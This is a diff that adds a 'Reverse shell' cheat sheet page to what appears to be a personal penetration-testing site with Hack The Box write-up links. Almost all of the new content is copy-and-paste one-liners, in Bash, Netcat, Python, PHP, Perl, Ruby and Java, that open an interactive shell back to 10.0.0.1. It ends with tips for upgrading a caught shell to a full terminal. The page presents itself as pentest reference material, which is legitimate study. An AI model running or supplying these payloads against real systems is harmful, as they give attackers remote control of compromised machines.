@@ -17,25 +17,66 @@
                         <a class="d-none d-md-inline-block" href='about.html'>About</a>
                         <a class="d-none d-md-inline-block" href='cheatsheet.html'>Cheatsheet</a>
                         <a class="d-none d-md-inline-block" data-toggle="collapse" data-target="#writeupsMenu" 
-                            aria-controls="writeupsMenu" aria-expanded="false" aria-label="Toggle writeups menu" href="#">Write-ups</a>
+                                                                                   aria-controls="writeupsMenu" aria-expanded="false" aria-label="Toggle writeups menu" href="#">Write-ups</a>
                     </div>
                     <div class="collapse bg-white" id="writeupsMenu">
                         <div class="container pt-1 px-5 flex-md-row bg-white">
-                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB :: Zetta</a>
-                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB :: Registry</a>
-                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB :: Craft</a>
+                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB :: Zetta</a>
+                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB :: Registry</a>
+                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB :: Craft</a>
                         </div>
                     </div>
                 </nav>
             </header>
-            <main>
+            <main class="mt-5">
+                <section class="Header"> 
+                    <div class="container">
+                        <h6 class="subheader mb-0 pb-0">Cheat Sheet</h6>
+                        <h1 class="mt-0 pt-0 mb-4">Reverse shell</h1>
+                    </div>
+                </section>
+                <section class="content"> 
+                    <div class="container">
+                        <p class="preface">While doing penetration tests eventually you may find vulnerability which leads to a command execution. These reverse shells are quite commonly used in the *nix systems. Options for creating a reverse shell are limited by the scripting languages installed on the target system. Each of the methods below is aimed to be a one-liner that you can copy&amp;paste.</p>
+                        <h3>Bash</h3>
+                        <p>Some versions of bash can send you a reverse shell or even a file thru this device
+                        <pre>bash -i &amp;&gt; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
+                        <h3>Netcat</h3>
+                        <p>Netcat is rarely present on production systems but in case you find one you can get a shell</p>
+                        <pre>nc -e /bin/sh 10.0.0.1 1234</pre>
+                        <p>Sometimes the <code>-e</code> option is not supported. If there is a Netcat this will work every time</p>
+                        <pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
+                        <h3>Python</h3>
+                        <p>This was tested under Linux/MacOS X in Python 2.7 and Python 3.7.6</p>
+                        <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+                        <h3>PHP</h3>
+                        <p>This code assumes that the TCP connection uses file descriptor 3. If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
+                        <pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
+                        <h3>PERL</h3>
+                        <pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");
+open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
+                        <h3>Ruby</h3>
+                        <pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
+                        <h3>Java</h3>
+                        <pre>r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()</pre>
+                        <p class="my-5">PS.<br>After you catch a shell you might also need normally working terminal with history and backspace.<br>
+                        Press <kbd>Ctrl + Z</kbd> on the keyboard and type <code>stty raw -echo</code> and hit <kbd>Enter</kbd>.<br>
+                        Type <code>fg</code> (you won't be able to see entered command on the screen) and hit <kbd>Enter</kbd>.<br>
+                        Now type <code>reset</code> and hit <kbd>Enter</kbd> twice.</p>
+                    </div>
+                </section>
             </main>
         </div>
         <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" 
-            integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+                integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
         <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" 
-            integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+                integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
         <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" 
-            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+                integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
     </body>
 </html>
